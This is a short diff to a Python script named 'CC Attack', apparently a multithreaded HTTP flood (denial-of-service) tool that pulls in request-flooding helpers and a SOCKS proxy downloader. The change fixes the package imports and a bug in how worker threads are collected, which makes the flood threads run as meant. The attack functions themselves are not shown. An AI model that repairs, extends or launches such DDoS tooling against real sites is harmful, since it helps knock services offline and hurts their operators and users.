@@ -1,8 +1,9 @@
 import argparse
 from threading import Thread
 from multiprocessing import Manager
-from cc_fun import send_request, slow, check
-from socks_proxy_getter import download_socks
+
+from .utils.cc_fun import send_request, slow, check
+from .utils.socks_proxy_getter import download_socks
 
 parser = argparse.ArgumentParser(prog="CC Attack")
 parser.add_argument('mode', type=str, nargs=1)
@@ -28,7 +29,7 @@ def main():
     th.start()
     for _ in range(thread_num):
         th = Thread(target=run, args=(mode, url, stop))
-        th_list.append(th_list)
+        th_list.append(th)
         th.start()
 
     for th in th_list:
